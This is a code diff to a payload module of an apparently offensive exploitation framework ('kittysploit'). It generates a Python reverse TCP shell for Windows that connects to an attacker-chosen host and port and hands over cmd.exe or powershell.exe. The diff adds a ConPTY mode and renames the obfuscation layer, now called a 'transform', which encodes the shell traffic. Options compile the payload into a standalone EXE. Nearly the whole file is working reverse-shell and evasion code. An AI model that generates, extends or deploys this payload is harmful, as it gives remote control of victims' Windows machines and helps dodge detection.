@@ -1,6 +1,8 @@
 from kittysploit import *
 import base64
 
+from lib.shell.pty_runtime import build_windows_conpty_script
+
 
 class Module(Payload):
 
@@ -8,7 +10,7 @@ class Module(Payload):
 
 	__info__ = {
 		'name': 'Windows Command Shell, Reverse TCP (via Python)',
-		'description': 'Connect back and create a command shell via Python (works on Windows; uses subprocess+threads, no dup2)',
+		'description': 'Connect back and create a command shell via Python (ConPTY when use_pty=true; Win10 1809+)',
 		'category': 'singles',
 		'arch': Arch.PYTHON,
 		'platform': Platform.WINDOWS,
@@ -20,25 +22,33 @@ class Module(Payload):
 	lport = OptPort(5555, 'Bind Port', True)
 	shell_binary = OptString('cmd.exe', 'Shell to use (cmd.exe or powershell.exe)', True, True)
 	python_binary = OptString("python", "Python binary (python or py)", True)
+	use_pty = OptBool(True, "Spawn shell via ConPTY (tab completion, full console; Win10 1809+)", False, True)
 	encoder = OptString("", "Encoder", False, True)
 	compile_exe = OptBool(False, "Compile to EXE (requires Zig)", False, True)
 	standalone_exe = OptBool(False, "Standalone EXE (embed Python, no install needed; requires embeddable zip)", False, True)
 	output_path = OptString("", "Output EXE path when compile_exe=true (default: payload.exe)", False, True)
 	embeddable_path = OptString("", "Path to pythonX.Y-embed-amd64.zip (standalone only)", False, True)
 
-	def _build_script(self, host: str, port: int, shell: str, obf_client_code: str = None) -> str:
+	def _build_script(self, host: str, port: int, shell: str, xf_client_code: str = None) -> str:
 		"""Build the Python script (used by generate and get_python_script)."""
-		if obf_client_code:
-			on_connect = "_obf_send_client_hello(s)\n" if "_obf_send_client_hello" in obf_client_code else ""
+		if bool(self.use_pty):
+			return build_windows_conpty_script(host, port, shell, xf_code=xf_client_code)
+
+		if xf_client_code:
+			on_connect = ""
+			if "_xf_send_client_hello" in xf_client_code:
+				on_connect = "_xf_send_client_hello(s)\n"
+			elif "_xf_send_handshake" in xf_client_code:
+				on_connect = "_xf_send_handshake(s)\n"
 			return (
 				"import socket,subprocess,threading\n"
-				+ obf_client_code + "\n"
+				+ xf_client_code + "\n"
 				+ f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
 				+ f"s.connect(('{host}',{port}))\n"
 				+ on_connect
 				+ f"p=subprocess.Popen(['{shell}'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
-				"def r():\n while True:\n  try: d=s.recv(4096)\n  except: break\n  if not d: break\n  p.stdin.write(_obf_decode(d)); p.stdin.flush()\n"
-				"def w():\n buf=b''\n while True:\n  try: c=p.stdout.read(1)\n  except: break\n  if not c: break\n  buf+=c\n  if c==b'\\n' or len(buf)>=64: s.sendall(_obf_encode(buf)); buf=b''\n if buf: s.sendall(_obf_encode(buf))\n"
+				"def r():\n while True:\n  try: d=s.recv(4096)\n  except: break\n  if not d: break\n  p.stdin.write(_xf_decode(d)); p.stdin.flush()\n"
+				"def w():\n buf=b''\n while True:\n  try: c=p.stdout.read(1)\n  except: break\n  if not c: break\n  buf+=c\n  if c==b'\\n' or len(buf)>=64: s.sendall(_xf_encode(buf)); buf=b''\n if buf: s.sendall(_xf_encode(buf))\n"
 				"t1,t2=threading.Thread(target=r),threading.Thread(target=w)\nt1.daemon=t2.daemon=True\nt1.start();t2.start()\nt1.join();t2.join()\n"
 			)
 		return (
@@ -72,11 +82,11 @@ class Module(Payload):
 		host = str(self.lhost)
 		port = int(self.lport)
 		shell = str(self.shell_binary).replace("'", "'\"'\"'")
-		obf = self._get_obfuscator_instance()
-		obf_code = None
-		if obf and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
-			obf_code = obf.generate_client_code(self._get_client_language())
-		return self._build_script(host, port, shell, obf_code)
+		xf = self._get_transform_instance()
+		xf_code = None
+		if xf and self._is_transform_compatible(xf) and hasattr(xf, "generate_client_code"):
+			xf_code = xf.generate_client_code(self._get_client_language())
+		return self._build_script(host, port, shell, xf_code)
 
 	def generate(self):
 		host = str(self.lhost)
@@ -84,17 +94,17 @@ class Module(Payload):
 		shell = str(self.shell_binary).replace("'", "'\"'\"'")
 		py = str(self.python_binary)
 
-		obf = self._get_obfuscator_instance()
-		obf_code = None
-		if obf and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
-			obf_code = obf.generate_client_code(self._get_client_language())
-		if obf and not self._is_obfuscator_compatible(obf):
+		xf = self._get_transform_instance()
+		xf_code = None
+		if xf and self._is_transform_compatible(xf) and hasattr(xf, "generate_client_code"):
+			xf_code = xf.generate_client_code(self._get_client_language())
+		if xf and not self._is_transform_compatible(xf):
 			from core.output_handler import print_warning
 			lang = self._get_client_language() or "?"
-			supported = getattr(obf, "get_supported_client_languages", lambda: [])()
-			print_warning(f"Obfuscator does not support client language '{lang}' for this payload (supported: {supported}). Generating without obfuscation.")
+			supported = getattr(xf, "get_supported_client_languages", lambda: [])()
+			print_warning(f"Transform does not support client language '{lang}' for this payload (supported: {supported}). Generating without stream transform.")
 
-		script = self._build_script(host, port, shell, obf_code)
+		script = self._build_script(host, port, shell, xf_code)
 
 		# Compile to EXE if requested
 		if self.compile_exe:
